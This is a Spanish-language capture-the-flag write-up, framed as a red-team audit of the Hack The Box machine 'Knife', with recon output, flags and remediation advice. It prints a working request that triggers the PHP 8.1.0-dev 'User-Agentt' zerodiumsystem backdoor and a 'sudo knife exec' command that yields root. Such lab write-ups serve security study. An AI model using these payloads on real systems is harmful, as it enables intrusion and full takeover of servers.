# REPORTE DE AUDITORÍA RED TEAM — Knife (Hack The Box)

## Resumen Ejecutivo

| Campo | Detalle |
|-------|---------|
| **Target** | Knife — 10.129.70.6 |
| **Resultado** | Pwned — Root completo |
| **User Flag** | `7ab1621dab2fa84c27f9d9a016950663` |
| **Root Flag** | `34ed81a4550644574a67bec33ef064cf` |

---

## Fase 1: Reconocimiento

### Escaneo de puertos (Nmap)
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
```

### Enumeración web (Gobuster)
```
.htpasswd    (403)
.htaccess    (403)
index.php    (200)
server-status (403)
```

### Hallazgo crítico (Nikto)
```
X-Powered-By: PHP/8.1.0-dev
```
**PHP 8.1.0-dev** es una versión de desarrollo que fue liberada con una **backdoor integrada** el 28 de marzo de 2021.

---

## Fase 2: Explotación — RCE via PHP 8.1.0-dev Backdoor

**Vulnerabilidad:** PHP 8.1.0-dev — 'User-Agentt' Remote Code Execution (CVE sin asignar, EDB-ID: 49933)

**Mecanismo:** La backdoor se activa enviando un header HTTP `User-Agentt` con el payload `zerodiumsystem('...')`, que ejecuta comandos del sistema operativo.

**Ejecución:**
```python
headers = {
    "User-Agent": "Mozilla/5.0",
    "User-Agentt": "zerodiumsystem('id');"
}
response = requests.get("http://10.129.70.6/", headers=headers)
```

**Resultado:**
```
uid=1000(james) gid=1000(james) groups=1000(james)
```

---

## Fase 3: Post-Explotación — Escalada de Privilegios

### Enumeración como james
```bash
sudo -l
# User james may run the following commands on knife:
#     (root) NOPASSWD: /usr/bin/knife
```

**Knife** es la CLI de **Chef Infra Client** (v16.10.8). El subcomando `knife exec -E "code"` ejecuta código **Ruby** con los privilegios del usuario que lo invoca.

### Escalada
```bash
sudo /usr/bin/knife exec -E "system('id')"
# uid=0(root) gid=0(root) groups=0(root)
```

**Técnica:** `sudo knife exec` ejecuta Ruby como root → `system()` ejecuta comandos del SO → **shell root**.

---

## Fase 4: Flags

| Flag | Hash |
|------|------|
| **user.txt** | `7ab1621dab2fa84c27f9d9a016950663` |
| **root.txt** | `34ed81a4550644574a67bec33ef064cf` |

---

## Cadena de Ataque (MITRE ATT&CK)

| Fase | Técnica | ID |
|------|---------|-----|
| Reconocimiento | Active Scanning: Port Scan | T1595.002 |
| Explotación | Exploitation for Client Execution (PHP backdoor) | T1203 |
| Post-Explotación | Abuse Elevation Mechanism: Sudo (knife exec) | T1548.003 |
| Post-Explotación | Command and Scripting Interpreter: Ruby | T1059.006 |

---

## Remediación

1. **CRÍTICO:** Eliminar inmediatamente PHP 8.1.0-dev y actualizar a una versión estable (>=8.1.30 o superior)
2. **ALTO:** Revisar configuración de sudo — no debería permitir `knife exec` sin restricciones
3. **MEDIO:** Eliminar el header `X-Powered-By` para no divulgar versiones de PHP
4. **MEDIO:** Implementar headers de seguridad: CSP, HSTS, X-Content-Type-Options
